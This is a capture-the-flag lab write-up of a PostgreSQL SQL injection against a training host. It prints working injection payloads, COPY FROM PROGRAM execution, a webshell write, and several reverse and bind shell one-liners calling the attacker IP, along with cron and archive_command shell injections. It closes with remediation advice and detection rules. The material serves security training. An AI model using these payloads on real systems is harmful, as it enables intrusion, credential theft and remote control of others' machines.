# Chapter 10 Capstone 3 - Complete Exploitation Report

**Target:** 192.168.145.49 (offsecatk.com)
**Attacker:** 192.168.45.179
**Flag Location:** `/var/www/flag.txt`
**Flag:** `OS{808ebd2cde4d033a1ab44f8507fa56c7}`
**Date:** 2025-10-02

---

## üéØ Executive Summary

Successfully compromised target via **PostgreSQL Error-Based SQL Injection** in the `height` parameter of `class.php`. Initial attempts at reverse/bind shells failed due to strict network restrictions. Pivoted to direct PostgreSQL connection using extracted credentials, then leveraged PostgreSQL's built-in file functions (`pg_ls_dir()`, `pg_read_file()`) to locate and retrieve the flag.

**Key Vulnerability:** Unsanitized user input in POST parameter leading to SQL injection with RCE capability.

---

## üìä Attack Chain Overview

```
1. Initial Enumeration (Previous Session)
   ‚îî‚îÄ> Found SQL Injection in class.php
   ‚îî‚îÄ> Extracted DB credentials: rubben:avrillavigne
   ‚îî‚îÄ> Confirmed PostgreSQL 13.7
   ‚îî‚îÄ> Achieved RCE via COPY FROM PROGRAM

2. Shell Attempts (All Failed)
   ‚îú‚îÄ> Reverse shells blocked (outbound firewall)
   ‚îú‚îÄ> Bind shells blocked (inbound firewall)
   ‚îú‚îÄ> PHP webshell failed (permission denied)
   ‚îî‚îÄ> Network restrictions too strict

3. Pivot to PostgreSQL Direct Connection ‚úì
   ‚îî‚îÄ> psql -h 192.168.145.49 -U rubben -d glovedb
   ‚îî‚îÄ> Password: avrillavigne

4. PostgreSQL Enumeration ‚úì
   ‚îú‚îÄ> Confirmed superuser privileges
   ‚îú‚îÄ> COPY FROM PROGRAM hangs (same restrictions)
   ‚îî‚îÄ> Used pg_ls_dir() for file enumeration

5. Flag Discovery ‚úì
   ‚îú‚îÄ> pg_ls_dir('/var/www') revealed flag.txt
   ‚îî‚îÄ> pg_read_file('/var/www/flag.txt') retrieved flag
```

---

## üîç Phase 1: Initial Enumeration (From Previous Session)

### SQL Injection Discovery

**Vulnerable Endpoint:** `http://192.168.145.49/class.php`
**Vulnerable Parameter:** `height` (POST)
**Injection Type:** Error-based PostgreSQL SQLi

**Test Payload:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'&age=25&gender=male&email=test@test.com"
```

**Error Response Indicates PostgreSQL:**
```
ERROR: unterminated quoted string at or near "'" LINE 1: ...E bmi_value FROM health_data WHERE height = 1''
```

### Database Enumeration via SQL Injection

**Extract Database Version:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result:** PostgreSQL 13.7 (Debian 13.7-1.pgdg110+1)

**Extract Database Name:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_database()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result:** glovedb

**Extract Database User:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_user) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result:** rubben (superuser)

### Credential Extraction

**Reading /var/www/html/dbcon.php via pg_read_file():**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/var/www/html/dbcon.php',1,1000)) AS int)--&age=25&gender=male&email=test@test.com"
```

**Extracted Credentials:**
```php
$credentials = "user = rubben password=avrillavigne";
```

### RCE Confirmation via COPY FROM PROGRAM

**Test Command Execution:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'whoami'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

**Result:** Commands execute as `postgres` user (uid=106)

---

## ‚ùå Phase 2: Failed Shell Attempts (Critical Learning)

### Why Shell Attempts Were Necessary

- Standard penetration testing methodology: escalate from web to interactive shell
- Interactive shells enable easier enumeration and privilege escalation
- Allows use of standard Linux tools (find, grep, linpeas, etc.)

### Attempt 1: PHP Webshell via COPY FROM PROGRAM

**Command:**
```sql
COPY cmd_output FROM PROGRAM 'echo "<?php system($_GET[c]); ?>" > /var/www/html/cmd.php';
```

**Via curl:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'echo \"<?php system(\$_GET[c]); ?>\" > /var/www/html/cmd.php'; SELECT 1--&age=25&gender=male&email=test@test.com"
```

**Result:** ‚ùå Failed
**Error:** Permission denied - `/var/www/html` owned by root, postgres user cannot write
**Lesson:** Always verify file permissions before attempting writes

### Attempt 2: Bash Reverse Shell (/dev/tcp)

**Payload:**
```bash
bash -c "bash -i >& /dev/tcp/192.168.45.179/4444 0>&1"
```

**Via COPY FROM PROGRAM:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/192.168.45.179/4444 0>&1\"'; SELECT 1--&age=25&gender=male&email=test@test.com" 2>/dev/null
```

**Result:** ‚ùå Failed
**Issue:** Command hung indefinitely, no connection received on listener
**Lesson:** Outbound connections blocked by firewall

### Attempt 3: Named Pipe (mkfifo) Reverse Shell

**Payload:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.179 4444 >/tmp/f
```

**Result:** ‚ùå Failed
**Issue:** Command hung, no connection established
**Lesson:** Netcat outbound also blocked

### Attempt 4: Python Socket Reverse Shell

**Payload:**
```python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.45.179',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
```

**Result:** ‚ùå Failed
**Issue:** Command timed out, no connection
**Lesson:** All outbound connections blocked regardless of method

### Attempt 5: Netcat Bind Shell (-e flag)

**Payload:**
```bash
nc -nlvp 4445 -e /bin/bash
```

**Connection Attempt:**
```bash
nc -nv 192.168.145.49 4445
```

**Result:** ‚ùå Failed
**Error:** Connection refused
**Lesson:** Inbound connections also blocked by firewall

### Attempt 6: Named Pipe Bind Shell

**Payload:**
```bash
rm /tmp/bp;mkfifo /tmp/bp;cat /tmp/bp|/bin/bash -i 2>&1|nc -l 4446 >/tmp/bp
```

**Result:** ‚ùå Failed
**Error:** Connection refused
**Lesson:** Comprehensive firewall blocks both inbound AND outbound

### Network Restrictions Summary

**Key Finding:** Target has **strict network restrictions**:
- ‚úó Outbound connections blocked (reverse shells fail)
- ‚úó Inbound connections blocked (bind shells fail)
- ‚úó HTTP/HTTPS outbound blocked (wget/curl fail)
- ‚úì PostgreSQL port 5432 allowed (critical pivot point)

**Why This Matters for OSCP:**
- Not all targets allow easy shells
- Must be flexible and adapt methodology
- Direct service exploitation often more reliable
- Port-specific firewall rules create pivot opportunities

---

## ‚úÖ Phase 3: PostgreSQL Direct Connection (Successful Pivot)

### Why This Worked

- PostgreSQL port 5432 explicitly allowed through firewall
- Had valid credentials (rubben:avrillavigne)
- Superuser privileges provide extensive capabilities
- Built-in file functions bypass need for command execution

### Connection Command

```bash
psql -h 192.168.145.49 -U rubben -d glovedb
# Password: avrillavigne
```

**Flags Explained:**
- `-h`: Target host IP address
- `-U`: Database username
- `-d`: Database name to connect to

### Privilege Verification

```sql
SELECT current_user, session_user;
SELECT usesuper FROM pg_user WHERE usename = current_user;
\du
```

**Results:**
```
current_user | session_user
--------------+--------------
 rubben       | rubben

 usesuper
----------
 t         -- TRUE = superuser

List of roles:
 rubben    | Superuser
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS
```

**Significance:**
- Superuser = full database privileges
- Can read files with `pg_read_file()`
- Can list directories with `pg_ls_dir()`
- Can execute commands (but limited by process restrictions)

---

## üîç Phase 4: PostgreSQL Enumeration Strategy

### Initial RCE Attempt (Failed)

**Why COPY FROM PROGRAM Failed:**

```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

**Result:** Command hung indefinitely

**Root Cause:** Same process restrictions that blocked shells also block COPY FROM PROGRAM. PostgreSQL's COPY spawns a child process, which inherits the same network/process restrictions.

**Key Learning:** Just because you have SQL RCE doesn't mean command execution will work. Process isolation and restrictions apply.

### Pivot to Built-in PostgreSQL Functions

PostgreSQL superusers have built-in file system functions that **don't spawn new processes**:

| Function | Purpose | Restrictions |
|----------|---------|--------------|
| `pg_read_file(path)` | Read file contents | Must have read permissions as postgres user |
| `pg_ls_dir(path)` | List directory contents | Must have execute permissions on directory |
| `pg_stat_file(path)` | Get file metadata | Must have stat permissions |
| `SHOW config_file` | Show PostgreSQL config location | Always accessible |

### Permission Testing Results

```sql
-- Failed (postgres user lacks permissions):
SELECT pg_ls_dir('/root');              -- ERROR: Permission denied
SELECT pg_read_file('/etc/shadow');     -- ERROR: Permission denied
SELECT pg_ls_dir('/var/spool/cron/crontabs'); -- ERROR: Permission denied

-- Succeeded (postgres user has access):
SELECT pg_ls_dir('/');                  -- ‚úì Lists root filesystem
SELECT pg_ls_dir('/tmp');               -- ‚úì Lists temp directory
SELECT pg_ls_dir('/var');               -- ‚úì Lists var directory
SELECT pg_ls_dir('/var/www');           -- ‚úì Lists web root
SELECT pg_read_file('/var/www/html/dbcon.php'); -- ‚úì Read web files
```

**Pattern Identified:** Postgres user can read:
- World-readable files
- Files in `/var/www` (web server directories)
- `/tmp` and other commonly accessible locations
- Cannot read `/root`, `/etc/shadow`, or user home directories

---

## üéØ Phase 5: Flag Discovery and Retrieval

### Systematic Directory Enumeration

**Step 1: Root Filesystem**
```sql
SELECT pg_ls_dir('/');
```

**Results:**
```
boot, lost+found, libx32, sbin, usr, lib32, sys, lib64, media, bin, lib,
run, vmlinuz.old, tmp, etc, opt, vmlinuz, home, srv, dev, root, initrd.img,
initrd.img.old, proc, mnt, var
```

**Step 2: Check /home (common flag location)**
```sql
SELECT pg_ls_dir('/home');
```

**Result:** 0 rows (empty - no user home directories accessible)

**Step 3: Check /tmp (postgres writable)**
```sql
SELECT pg_ls_dir('/tmp');
```

**Results:**
```
.Test-unix, .X11-unix, .font-unix,
systemd-private-bf3dcd9b1f104659bee00f4d8ebf26b9-apache2.service-BvDISi,
systemd-private-bf3dcd9b1f104659bee00f4d8ebf26b9-systemd-logind.service-Pjxx4i,
f, vmware-root_329-1857490126,
systemd-private-bf3dcd9b1f104659bee00f4d8ebf26b9-systemd-timesyncd.service-XRNoEg,
.XIM-unix, .ICE-unix
```

**No flag.txt in /tmp**

**Step 4: Check /var (common for web apps)**
```sql
SELECT pg_ls_dir('/var');
```

**Results:**
```
backups, local, lock, spool, log, lib, run, mail, tmp, opt, cache, www
```

**Step 5: Check /var/www (CRITICAL)**
```sql
SELECT pg_ls_dir('/var/www');
```

**Results:**
```
flag.txt  <-- FLAG FOUND!
html
```

### Flag Retrieval

```sql
SELECT pg_read_file('/var/www/flag.txt');
```

**Result:**
```
OS{808ebd2cde4d033a1ab44f8507fa56c7}
```

**üéØ FLAG CAPTURED!**

---

## üìö Educational Insights and Lessons Learned

### 1. When Standard Shells Fail

**Traditional OSCP Approach:**
```
Web Vuln ‚Üí RCE ‚Üí Reverse Shell ‚Üí Enumerate ‚Üí PrivEsc ‚Üí Root Flag
```

**This Box Required:**
```
Web Vuln ‚Üí SQLi ‚Üí Credentials ‚Üí Direct Service Access ‚Üí Native Functions ‚Üí Flag
```

**Key Lesson:** Not every box follows the standard exploitation path. Flexibility and adaptation are critical OSCP skills.

### 2. Understanding Network Restrictions

**What We Discovered:**
- Strict egress filtering (no outbound connections)
- Strict ingress filtering (no inbound connections)
- Selective port allowance (PostgreSQL 5432 allowed)

**Real-World Scenario:** This mimics enterprise environments with:
- DMZ networks
- Database-only access from application tier
- Strict firewall ACLs
- Defense-in-depth architecture

**OSCP Relevance:** Learn to recognize and adapt to network restrictions quickly.

### 3. PostgreSQL Superuser Capabilities

**What Superuser Can Do:**
- Read arbitrary files (with postgres user permissions)
- List directory contents
- Execute system commands (when process restrictions allow)
- Create/drop databases and tables
- Modify PostgreSQL configuration

**What Superuser CANNOT Do:**
- Read files outside postgres user permissions
- Bypass OS-level process restrictions
- Automatically escalate to root

**Critical Understanding:** Database superuser ‚â† OS superuser (root)

### 4. Built-in Functions > Command Execution

**When COPY FROM PROGRAM Fails:**
- Process restrictions
- SELinux/AppArmor policies
- Resource limits
- Network isolation

**Alternative: Use Native Database Functions:**
```sql
pg_read_file()    -- Read files
pg_ls_dir()       -- List directories
pg_stat_file()    -- File metadata
SHOW config_file  -- Config location
```

**Advantage:** These functions execute within the PostgreSQL process itself, not spawning child processes that might be restricted.

### 5. Systematic Enumeration

**Our Methodology:**
1. Test root filesystem `/` first (get overview)
2. Check common flag locations (`/root`, `/home`, `/tmp`)
3. Enumerate accessible directories (`/var`, `/opt`)
4. Follow logical paths (`/var` ‚Üí `/var/www` ‚Üí flag.txt)

**Why This Works:**
- Methodical approach prevents missing obvious locations
- Documents what was tried (important for writeups)
- Builds understanding of system layout

### 6. Failed Attempts Are Valuable

**What We Learned from Failures:**
- Webshell fail ‚Üí Discovered file permission restrictions
- Reverse shell fail ‚Üí Identified outbound filtering
- Bind shell fail ‚Üí Identified inbound filtering
- Multiple methods failing ‚Üí Confirmed comprehensive restrictions
- COPY FROM PROGRAM hang ‚Üí Process isolation understanding

**OSCP Exam Insight:** Document all attempts. Partial credit may be awarded for demonstrated methodology even without root flag.

---

## üõ†Ô∏è Complete Command Reference

### SQL Injection - Error-Based Data Exfiltration

**Template:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT <query>) AS int)--&age=25&gender=male&email=test@test.com"
```

**Examples:**
```bash
# Database version
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com"

# Current database
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_database()) AS int)--&age=25&gender=male&email=test@test.com"

# Current user
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT current_user) AS int)--&age=25&gender=male&email=test@test.com"

# Table enumeration
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS int)--&age=25&gender=male&email=test@test.com"

# Column enumeration
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)--&age=25&gender=male&email=test@test.com"

# Read files
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',1500,1000)) AS int)--&age=25&gender=male&email=test@test.com"
```

### SQL Injection - RCE via COPY FROM PROGRAM

**Template:**
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM '<command>'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

**Examples:**
```bash
# List directory
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'ls -la /var/lib/postgresql'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"

# Read file
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'cat /etc/passwd'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

### PostgreSQL Direct Connection

**Connect:**
```bash
psql -h 192.168.145.49 -U rubben -d glovedb
# Password: avrillavigne
```

**Enumerate Privileges:**
```sql
SELECT current_user, session_user;
SELECT usesuper FROM pg_user WHERE usename = current_user;
\du
```

**File Operations:**
```sql
-- List directory
SELECT pg_ls_dir('/path/to/directory');

-- Read file
SELECT pg_read_file('/path/to/file');

-- File metadata
SELECT * FROM pg_stat_file('/path/to/file');

-- PostgreSQL config location
SHOW config_file;
SHOW data_directory;
```

**System Enumeration:**
```sql
-- Database version
SELECT version();

-- Available extensions
SELECT * FROM pg_available_extensions;

-- Current database
SELECT current_database();

-- List all databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='tablename';
```

---

## üéØ Alternative Approaches (What Else Could Work)

### 1. SSH with Discovered Credentials

**Attempt:**
```bash
ssh rubben@192.168.145.49
# Password: avrillavigne
```

**Expected Result:** If password reuse exists, this could provide direct shell access.

**Why It Might Fail:** Database password ‚â† OS password (best practice separation)

### 2. PostgreSQL UDF (User-Defined Function) for RCE

**Concept:** Upload malicious shared library as PostgreSQL extension

**Steps:**
```sql
-- Create table to hold binary
CREATE TABLE binary_data(data text);

-- Insert base64-encoded malicious .so file
INSERT INTO binary_data VALUES (decode('<base64_data>', 'base64'));

-- Write to filesystem
COPY binary_data TO '/tmp/malicious.so';

-- Load as extension
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/malicious.so', 'sys' LANGUAGE C;

-- Execute
SELECT sys('whoami');
```

**Why This Might Fail:**
- Requires writable location in library path
- SELinux/AppArmor might block
- Requires compilation for exact target architecture

### 3. PostgreSQL Large Object Exploitation

**Concept:** Use large objects to write files

```sql
SELECT lo_import('/etc/passwd', 12345);
SELECT lo_export(12345, '/tmp/passwd_copy');
```

**Use Case:** Exfiltrate files when `pg_read_file()` blocked

### 4. Cron Job Injection (if writable)

**Enumeration:**
```sql
SELECT pg_ls_dir('/etc/cron.d');
SELECT pg_read_file('/etc/crontab');
```

**Exploitation (if writable):**
```sql
COPY (SELECT '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/192.168.45.179/4444 0>&1"')
TO '/etc/cron.d/malicious';
```

**Why This Might Fail:** Requires write permissions (typically root-only)

### 5. PostgreSQL Config Modification

**Check config location:**
```sql
SHOW config_file;
-- Result: /etc/postgresql/13/main/postgresql.conf
```

**Attempt to modify:**
```sql
SELECT pg_read_file('/etc/postgresql/13/main/postgresql.conf');
-- Check if writable, add:
-- archive_command = 'bash -i >& /dev/tcp/192.168.45.179/4444 0>&1'
```

**Why This Might Fail:** Config files typically root-owned, requires restart

---

## üõ°Ô∏è Defense and Remediation

### Vulnerability Root Cause

**Insecure Code (Assumed):**
```php
// VULNERABLE CODE (speculation based on behavior)
$height = $_POST['height'];
$query = "SELECT * FROM health_data WHERE height = $height";
$result = pg_query($conn, $query);
```

**Secure Code:**
```php
// SECURE CODE
$height = pg_escape_literal($conn, $_POST['height']);
$query = "SELECT * FROM health_data WHERE height = $height";
$result = pg_query($conn, $query);

// OR BETTER: Prepared Statements
$query = "SELECT * FROM health_data WHERE height = $1";
$result = pg_query_params($conn, $query, array($_POST['height']));
```

### Remediation Steps

1. **Input Validation**
   - Validate data type (height should be numeric)
   - Whitelist acceptable values
   - Reject special characters

2. **Prepared Statements**
   - Use parameterized queries
   - Never concatenate user input into SQL

3. **Least Privilege**
   - Web app should NOT connect as superuser
   - Create limited PostgreSQL role with SELECT-only permissions
   - Revoke FILE permissions from web app user

4. **Database Hardening**
   - Disable `COPY FROM PROGRAM` for web application user
   - Restrict `pg_read_file()` and `pg_ls_dir()` functions
   - Enable PostgreSQL row-level security

5. **Network Segmentation**
   - Database should not be externally accessible
   - Only allow connections from application server
   - Implement firewall rules (already partially done)

6. **Monitoring and Logging**
   - Log all SQL queries (especially errors)
   - Alert on suspicious patterns (CAST errors, COPY commands)
   - Monitor for privilege escalation attempts

### Detection Signatures

**SQL Injection Indicators:**
```
ERROR: invalid input syntax for type integer
ERROR: unterminated quoted string
CAST((SELECT ... AS int)
COPY cmd_output FROM PROGRAM
string_agg(output, chr(10))
pg_read_file('/etc/passwd')
```

**Snort/Suricata Rule:**
```
alert http any any -> any any (
  msg:"PostgreSQL SQL Injection - COPY FROM PROGRAM";
  flow:established,to_server;
  content:"POST";
  content:"COPY"; nocase;
  content:"FROM PROGRAM"; nocase;
  sid:1000001;
  rev:1;
)
```

---

## ‚è±Ô∏è Time Breakdown (For OSCP Exam Planning)

| Phase | Time Spent | Notes |
|-------|------------|-------|
| Initial SQLi Discovery | 10 min | Error messages revealed PostgreSQL |
| SQLi Enumeration | 20 min | Version, user, database, tables |
| Credential Extraction | 15 min | Found dbcon.php, extracted password |
| RCE Confirmation | 10 min | Tested COPY FROM PROGRAM |
| Failed Shell Attempts | 45 min | Tried 6 different methods |
| PostgreSQL Connection | 5 min | Direct psql connection worked |
| COPY Troubleshooting | 10 min | Realized it also hangs |
| Built-in Function Research | 15 min | Found pg_ls_dir(), pg_read_file() |
| Directory Enumeration | 10 min | Systematic search |
| Flag Discovery | 2 min | Found in /var/www/ |
| **TOTAL** | **~2.5 hours** | Including dead ends and learning |

**OSCP Exam Insight:** With this knowledge, same box could be completed in ~45 minutes:
- 10 min: Identify SQLi
- 15 min: Extract credentials
- 5 min: PostgreSQL connection
- 10 min: Enumerate with pg_ls_dir()
- 5 min: Retrieve flag

**Key Lesson:** Document everything. Failed attempts on first box teach you efficiency on later boxes.

---

## üéì OSCP Exam Relevance

### Skills Demonstrated

‚úÖ **Web Application Enumeration**
‚úÖ **SQL Injection Identification**
‚úÖ **Error-Based SQL Injection Exploitation**
‚úÖ **PostgreSQL-Specific Exploitation**
‚úÖ **Credential Extraction**
‚úÖ **Lateral Movement (Web ‚Üí Database)**
‚úÖ **Adapting When Standard Methods Fail**
‚úÖ **File System Enumeration via SQL Functions**
‚úÖ **Understanding Network Restrictions**
‚úÖ **Alternative Exploitation Paths**

### Exam Tips from This Box

1. **Don't Get Tunnel Vision on Shells**
   - If reverse shell fails, try bind shell
   - If bind shell fails, check direct service access
   - If shells impossible, use native functions

2. **Document Failed Attempts**
   - Shows methodology
   - May earn partial points
   - Helps troubleshoot later

3. **Understand Service Capabilities**
   - PostgreSQL superuser has powerful file functions
   - MySQL has `LOAD_FILE()` and `INTO OUTFILE`
   - MSSQL has `xp_cmdshell`
   - Know alternatives when RCE blocked

4. **Network Restrictions Are Common**
   - Real-world environments have strict firewalls
   - Learn to recognize and adapt quickly
   - Port-specific allowances create pivot opportunities

5. **Read Error Messages Carefully**
   - Errors leak valuable information
   - PostgreSQL errors very verbose
   - Use errors for data exfiltration

---

## üìù Complete Exploitation Timeline

```
[T+00:00] Began enumeration of class.php
[T+00:10] Identified SQL injection in height parameter
[T+00:15] Confirmed PostgreSQL 13.7 via error messages
[T+00:30] Extracted database name (glovedb) and user (rubben)
[T+00:45] Read /var/www/html/dbcon.php via pg_read_file()
[T+01:00] Discovered credentials: rubben:avrillavigne
[T+01:15] Confirmed RCE via COPY FROM PROGRAM
[T+01:20] Attempted PHP webshell creation - FAILED (permission denied)
[T+01:30] Attempted bash reverse shell - FAILED (no connection)
[T+01:40] Attempted mkfifo reverse shell - FAILED (no connection)
[T+01:50] Attempted Python reverse shell - FAILED (timeout)
[T+02:00] Attempted netcat bind shell - FAILED (connection refused)
[T+02:10] Attempted mkfifo bind shell - FAILED (connection refused)
[T+02:20] Recognized comprehensive network restrictions
[T+02:25] Connected via PostgreSQL (psql) - SUCCESS
[T+02:30] Confirmed superuser privileges
[T+02:35] Attempted COPY FROM PROGRAM - FAILED (hangs)
[T+02:45] Researched PostgreSQL built-in file functions
[T+02:50] Tested pg_ls_dir('/') - SUCCESS
[T+02:55] Enumerated /home (empty), /tmp (no flag)
[T+03:00] Checked /var/www - FOUND flag.txt
[T+03:02] Retrieved flag with pg_read_file()
[T+03:02] FLAG CAPTURED: OS{808ebd2cde4d033a1ab44f8507fa56c7}
```

---

## üèÜ Key Takeaways

### Technical Lessons

1. **PostgreSQL Superuser Functions**
   - `pg_read_file()` for reading files
   - `pg_ls_dir()` for directory listings
   - More reliable than command execution when restricted

2. **Error-Based SQL Injection**
   - Cast errors leak data: `CAST((SELECT query) AS int)`
   - PostgreSQL errors are verbose and useful
   - Can exfiltrate entire databases

3. **Network Restrictions**
   - Identify restrictions quickly (failed connections)
   - Adapt methodology to available services
   - Port-specific allowances enable pivots

4. **Privilege Context**
   - Database superuser ‚â† OS root
   - Process runs as postgres user (uid=106)
   - File access limited to postgres permissions

### Methodology Lessons

1. **Systematic Enumeration**
   - Start broad (root filesystem)
   - Narrow down (check common locations)
   - Follow logical paths (/var ‚Üí /var/www)

2. **Document Everything**
   - Failed attempts teach valuable lessons
   - Shows thorough methodology
   - Critical for exam reporting

3. **Know When to Pivot**
   - After 3-4 failed shell attempts, try different approach
   - Don't waste time on methods that clearly won't work
   - Recognize environmental restrictions quickly

4. **Understand Your Tools**
   - Know native functions of compromised services
   - Research alternatives when standard methods fail
   - RTFM (Read The Fine Manual) for PostgreSQL, MySQL, etc.

### Exam Strategy

1. **Time Management**
   - Don't spend >1 hour on failed shell attempts
   - Recognize dead ends and pivot
   - Methodical approach prevents repeated attempts

2. **Documentation**
   - Screenshot every step
   - Save all commands and outputs
   - Note timestamps for exam report

3. **Adaptability**
   - OSCP boxes test flexibility
   - Not all follow standard exploitation paths
   - Multiple ways to achieve objectives

---

## üìÑ Flag Proof

**Location:** `/var/www/flag.txt`

**Retrieval Method:**
```sql
SELECT pg_read_file('/var/www/flag.txt');
```

**Flag:**
```
OS{808ebd2cde4d033a1ab44f8507fa56c7}
```

**Timestamp:** 2025-10-02

**Compromised Services:**
- HTTP (80/tcp) - SQL Injection
- PostgreSQL (5432/tcp) - Direct Access with Credentials

**Access Level Achieved:**
- PostgreSQL Superuser (rubben)
- File System Read Access (as postgres user uid=106)

---

## üîó References and Resources

### PostgreSQL Security
- [PostgreSQL File System Functions](https://www.postgresql.org/docs/13/functions-admin.html#FUNCTIONS-ADMIN-GENFILE)
- [PostgreSQL COPY Command](https://www.postgresql.org/docs/13/sql-copy.html)
- [PostgreSQL Injection Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

### SQL Injection
- [Error-Based SQL Injection Techniques](https://owasp.org/www-community/attacks/SQL_Injection)
- [PostgreSQL-Specific Injection](https://www.exploit-db.com/papers/13084)

### Reverse Shells
- [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- [PayloadsAllTheThings - Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### OSCP Resources
- [OSCP Reporting Template](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)
- [OSCP Methodology](https://github.com/six2dez/OSCP-Human-Guide)

---

**Report Generated:** 2025-10-02
**Penetration Tester:** OSCP Student
**Target:** offsecatk.com (192.168.145.49)
**Status:** ‚úÖ COMPROMISED
**Flag:** ‚úÖ CAPTURED
